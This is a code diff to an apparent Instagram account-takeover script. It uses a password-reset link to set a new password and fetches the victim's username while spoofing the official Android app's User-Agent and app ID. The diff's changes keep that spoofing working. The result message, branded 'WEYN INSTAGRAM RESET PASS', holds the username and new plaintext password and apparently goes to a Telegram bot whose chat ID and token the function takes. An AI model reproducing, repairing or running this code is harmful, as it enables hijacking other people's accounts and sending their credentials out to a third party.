@@ -41,12 +41,18 @@ def make_headers(mid="", user_agent=""):
     }
 
 
-def id_user(user_id):
+def id_user(user_id, user_agent=""):
     try:
         url = f"https://i.instagram.com/api/v1/users/{user_id}/info/"
-        headers = {"User-Agent": "Instagram 219.0.0.12.117 Android"}
+        ua = user_agent or "Instagram 394.0.0.46.81 Android (30/11; 480dpi; 1080x1920; samsung; SM-G975F; intel; en_US; 123456789)"
+        headers = {
+            "User-Agent": ua,
+            "X-IG-App-ID": "567067343352427",
+            "Accept-Language": "en-US",
+        }
         r = requests.get(url, headers=headers, timeout=10)
-        return r.json()["user"]["username"]
+        data = r.json()
+        return data.get("user", {}).get("username") or None
     except:
         return None
 
@@ -120,13 +126,14 @@ def reset_instagram_password(reset_link, chat_id, bot_token, custom_password=Non
         }
         requests.post(url2, headers=make_headers(mid, USER_AGENT), data=data3, timeout=20)
 
-        username = id_user(str(user_id))
+        username = id_user(str(user_id), USER_AGENT)
 
+        display_username = username if username else f"uid:{user_id}"
         msg = (
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             f"   WEYN INSTAGRAM RESET PASS\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"USERNAME ➪  {username}\n"
+            f"USERNAME ➪  {display_username}\n"
             f"NEW PASSWORD ➪  {raw_pass}\n\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             f"        BY: @jinbelowg\n"
